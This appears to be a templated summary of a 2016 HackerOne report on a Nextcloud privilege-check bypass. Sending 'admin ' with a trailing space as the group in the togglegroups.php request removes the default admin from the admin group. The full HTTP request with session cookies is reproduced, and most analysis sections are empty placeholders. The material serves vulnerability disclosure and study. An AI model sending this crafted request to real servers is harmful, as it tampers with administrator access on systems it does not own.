# Business/Functional logic bypass: Remove admins from admin group.

## Metadata
- **Source:** HackerOne
- **Report:** 145745 | https://hackerone.com/reports/145745
- **Submitted:** 2016-06-18
- **Reporter:** paglababa
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Privilege Escalation
- **CVEs:** None
- **Category:** auth-crypto

## Summary
In nextcloud the default admin can not be removed from his admin group. The group toggle request looks like this:

```
POST /nextcloud/index.php/settings/ajax/togglegroups.php HTTP/1.1
Host: 139.59.9.184
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

In nextcloud the default admin can not be removed from his admin group. The group toggle request looks like this:

```
POST /nextcloud/index.php/settings/ajax/togglegroups.php HTTP/1.1
Host: 139.59.9.184
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: JQB5F2pqZwh8OUNVRzwVPxdmKCEbJDssbAUcORtfTVM=:bIHyZZPyIV67tsLPsWgrxCInGdOC40f2yD61Qn4HrTw=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Cookie: oc1jzqgvx8b9=e6gprie4u2ffkq83ivm68ccp80; oc_sessionPassphrase=BL2ccA7kLG%2FpxKWf5znZSBLWSvARKK%2Bv3oLuCFyGd8a5SAqPeeBjIaD88AVnwnMS8ompIL7tN45YiZeeODdFHyPBYZrZAavWsHJqMKZdvU3U6eZUW%2FHCGLMd62y6ty7P; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true
Connection: close
Content-Length: 25

username=test&group=test
```

If we use **admin** as the value of username and **admin ** as the value of group ( admin with a trailing space), the admin will be removed from the admin group.



</details>

---
*Analysed by Claude on 2026-05-24*
